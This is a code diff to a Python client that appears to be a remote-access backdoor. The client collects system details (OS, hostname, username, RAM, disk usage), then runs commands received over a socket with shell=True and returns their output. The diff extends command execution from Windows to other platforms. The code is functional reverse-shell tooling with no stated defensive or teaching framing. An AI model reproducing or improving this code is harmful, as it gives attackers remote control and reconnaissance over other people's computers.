@@ -1,3 +1,4 @@
+import getpass
 import threading
 from socket import *
 import platform
@@ -47,7 +48,7 @@ info = 'System: ' + platform.system()
 info += '\nOS Version: ' + version
 info += '\nMachine name: ' + node
 info += '\nProcessor: ' + processor
-info += '\nUser: ' + os.getlogin()
+info += '\nUser: ' + getpass.getuser()
 info += '\nRAM: ' + str(int(psutil.virtual_memory().total / 1048576)) + 'MB'
 info += '\nMain Disk Usage: ' + str(psutil.disk_usage('/').percent) + '% Full'
 info += '\nDisk File System: ' + str(psutil.disk_partitions())
@@ -83,14 +84,28 @@ while command != 'exit':
             print(e)
             clientSocket.send('0'.encode())
     else:
-        cmd = "cd C:\\Windows\\System32 && "
-        proc = subprocess.Popen(cmd+command, stdout=subprocess.PIPE, shell=True)
-        out, err = proc.communicate()
-        if out == b'':
-            notFound = "Command not found"
-            clientSocket.send(notFound.encode())
+        if platform.system() == 'Windows':
+            # necessario per windows per far eseguire i comandi
+            cmd = "cd C:\\Windows\\System32 && "
+            proc = subprocess.Popen(cmd + command, stdout=subprocess.PIPE, shell=True)
+            out, err = proc.communicate()
+            if out == b'':
+                notFound = "Command not found"
+                clientSocket.send(notFound.encode())
+                proc.kill()
+            else:
+                clientSocket.send(out)
+                proc.kill()
         else:
-            clientSocket.send(out)
+            proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
+            out, err = proc.communicate()
+            if out == b'':
+                notFound = "Command not found"
+                clientSocket.send(notFound.encode())
+                proc.kill()
+            else:
+                clientSocket.send(out)
+                proc.kill()
     command = clientSocket.recv(2048).decode()
 
 print("Connessione terminata")
